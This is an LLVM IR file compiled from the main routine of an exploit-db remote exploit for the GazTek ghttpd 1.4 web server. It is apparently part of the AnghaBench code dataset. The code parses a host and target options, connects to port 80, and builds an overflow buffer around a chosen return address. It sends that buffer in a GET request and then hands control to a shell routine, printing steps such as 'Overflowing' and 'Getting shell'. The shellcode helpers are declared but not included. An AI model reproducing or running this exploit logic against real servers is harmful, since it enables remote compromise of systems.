; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20929.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20929.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }

@.str = private unnamed_addr constant [57 x i8] c"\0A  GazTek HTTP Daemon v1.4 (ghttpd) exploit by qitest1\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"h:t:o:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"+Host: %s\0A  as: %s\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [22 x i8] c"+Connecting to %s...\0A\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"  connected\0A\00", align 1
@.str.5 = private unnamed_addr constant [38 x i8] c"+Building buffer with retaddr: %p...\0A\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"  done\0A\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"GET /%s\0A\0A\00", align 1
@mybuf = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [17 x i8] c"+Overflowing...\0A\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"+Zzing...\0A\00", align 1
@.str.10 = private unnamed_addr constant [19 x i8] c"+Getting shell...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i8* null, i8** %10, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %20

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 @usage(i8* %18)
  br label %20

20:                                               ; preds = %15, %2
  br label %21

21:                                               ; preds = %43, %20
  %22 = load i32, i32* %4, align 4
  %23 = load i8**, i8*** %5, align 8
  %24 = call i32 @getopt(i32 %22, i8** %23, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 %24, i32* %9, align 4
  %25 = load i32, i32* @EOF, align 4
  %26 = icmp ne i32 %24, %25
  br i1 %26, label %27, label %44

27:                                               ; preds = %21
  %28 = load i32, i32* %9, align 4
  switch i32 %28, label %38 [
    i32 104, label %29
    i32 116, label %32
    i32 111, label %35
  ]

29:                                               ; preds = %27
  %30 = load i32, i32* @optarg, align 4
  %31 = call i8* @strdup(i32 %30)
  store i8* %31, i8** %10, align 8
  br label %43

32:                                               ; preds = %27
  %33 = load i32, i32* @optarg, align 4
  %34 = call i32 @atoi(i32 %33)
  store i32 %34, i32* %6, align 4
  br label %43

35:                                               ; preds = %27
  %36 = load i32, i32* @optarg, align 4
  %37 = call i32 @atoi(i32 %36)
  store i32 %37, i32* %7, align 4
  br label %43

38:                                               ; preds = %27
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @usage(i8* %41)
  br label %43

43:                                               ; preds = %38, %35, %32, %29
  br label %21

44:                                               ; preds = %21
  %45 = load i8*, i8** %10, align 8
  %46 = icmp eq i8* %45, null
  br i1 %46, label %47, label %52

47:                                               ; preds = %44
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @usage(i8* %50)
  br label %52

52:                                               ; preds = %47, %44
  %53 = load i8*, i8** %10, align 8
  %54 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i64 %56
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %53, i8* %59)
  %61 = load i8*, i8** %10, align 8
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %61)
  %63 = load i8*, i8** %10, align 8
  %64 = call i32 @sockami(i8* %63, i32 80)
  store i32 %64, i32* %8, align 4
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  %66 = load i32, i32* %7, align 4
  %67 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %68 = load i32, i32* %6, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %67, i64 %69
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %70, i32 0, i32 1
  %72 = load i32, i32* %71, align 8
  %73 = add nsw i32 %72, %66
  store i32 %73, i32* %71, align 8
  %74 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %75 = load i32, i32* %6, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %74, i64 %76
  %78 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %77, i32 0, i32 1
  %79 = load i32, i32* %78, align 8
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0), i32 %79)
  %81 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %81, i64 %83
  %85 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %84, i32 0, i32 1
  %86 = load i32, i32* %85, align 8
  %87 = call i32 @do_mybuf(i32 %86)
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  %89 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %90 = load i8*, i8** @mybuf, align 8
  %91 = call i32 @sprintf(i8* %89, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i8* %90)
  %92 = load i32, i32* %8, align 4
  %93 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %94 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %95 = call i32 @strlen(i8* %94)
  %96 = call i32 @send(i32 %92, i8* %93, i32 %95, i32 0)
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i64 0, i64 0))
  %99 = call i32 @sleep(i32 2)
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.10, i64 0, i64 0))
  %101 = load i32, i32* %8, align 4
  %102 = call i32 @shellami(i32 %101)
  %103 = load i32, i32* %3, align 4
  ret i32 %103
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @strdup(i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @sockami(i8*, i32) #1

declare dso_local i32 @do_mybuf(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @shellami(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
